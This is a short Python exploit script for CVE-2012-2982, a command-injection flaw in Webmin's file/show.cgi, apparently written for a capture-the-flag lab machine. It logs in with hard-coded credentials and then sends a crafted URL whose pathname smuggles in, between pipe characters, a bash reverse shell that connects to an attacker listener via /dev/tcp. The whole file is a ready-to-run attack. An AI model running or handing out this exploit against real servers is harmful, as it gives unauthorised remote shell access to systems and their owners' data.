##################################################################################################################
# CVE : CVE-2012-2982												 #
# Description : file/show.cgi in Webmin 1.590 and earlier allows remote authenticated users to execute arbitrary #
#		commands via an invalid character in a pathname, as demonstrated by a | (pipe) character. 	 #
# Webmin Version : 1.580											 #
##################################################################################################################

#! /bin/python3

import requests
import string, secrets

TARGET_IP = "10.10.84.100"	# Change this
LHOST = "10.9.241.177"		# Change this
LPORT = 4444			# Change this

def random_alpha_num():
	alpha_num = string.ascii_letters + string.digits
	rand_str = "".join(secrets.choice(alpha_num) for i in range(5))
	return rand_str

def payload(l_host, l_port):
	return "bash -c 'exec bash -i &>/dev/tcp/" + l_host + "/" + str(l_port) + "<&1'"

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
login_url = "http://" + TARGET_IP + "/session_login.cgi"
payload = payload(LHOST, LPORT)
exploit_url = "http://" + TARGET_IP + "/file/show.cgi/bin/" + random_alpha_num() + "|" + payload + "|"
session_id = None
login_flag = False

print("[*] Atempting to login...")
r = requests.post(login_url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login successful...")
	session_id = r.headers['Set-Cookie'].split('=')[1].split(';')[0].strip()
	print("[+] Session ID : ", session_id)
	login_flag = True
else:
	print("[-] Login Failed, quitting...")

if login_flag:
	print("[*] Exploit URL :", exploit_url)
	print("[+] Exploiting target, check listener...")
	req = requests.post(exploit_url, cookies={"sid":session_id}, verify=False, allow_redirects=False)
